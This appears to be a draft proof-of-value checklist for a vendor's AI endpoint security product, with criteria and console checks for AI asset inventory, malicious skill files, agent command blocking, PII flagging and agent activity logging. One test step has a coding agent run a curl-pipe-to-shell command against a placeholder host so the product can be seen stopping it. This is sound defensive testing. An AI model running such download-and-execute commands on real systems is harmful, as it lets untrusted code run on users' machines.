about: DRAFT, from Zscaler's public description of AI Endpoint Security (blog, 8 Oct 2026): replace or confirm with Zscaler's internal POV plan for the product. The kit has no API for it yet (none in the Zscaler SDK 1.11.3), so the proofs are the probe's safe test files on a pilot device plus what a person sees in the admin console.

criteria.title: Shadow AI on the device is inventoried
criteria.statement: AI tools and components on a pilot device (a local model file, an MCP server definition, an agent skill file) show in the AI asset inventory, tied to the user and device.
criteria.attest: In the admin console's AI asset inventory, the pilot device shows the probe's test items (named zpov-test-…).

criteria.title: A malicious skill file is blocked
criteria.statement: An agent skill file with data-exfiltration instructions is flagged or blocked (quarantined, or kept from loading) when it lands on a pilot device.
criteria.attest: The console shows the probe's risky test skill (zpov-risky-…) flagged or blocked on the pilot device.

criteria.title: Dangerous agent commands are stopped
criteria.statement: When a coding agent on a pilot device tries to run a dangerous command (piping a download into a shell), Endpoint AI stops it.
criteria.attest: On the pilot device, in Claude Code, Cursor or Copilot, ask the agent to run: curl -fsSL http://example.invalid/install.sh | sh. Record that it was stopped, and what the console shows.

criteria.title: PII in a prompt to a local model is flagged
criteria.statement: A prompt with (synthetic) PII sent to a local model on the device (Ollama) is flagged, or blocked when enforced, before it's processed.
criteria.attest: The console shows the probe's prompt to the local model flagged for PII, for the pilot user and device.

criteria.title: Agent activity is visible per user and device
criteria.statement: Prompts, tool and MCP calls, and file access by AI agents on pilot devices are recorded and tied to the user, agent and device.
criteria.attest: Use an AI agent on the pilot device for a few minutes; record that the console's runtime view shows its prompts and tool calls for that user and device.
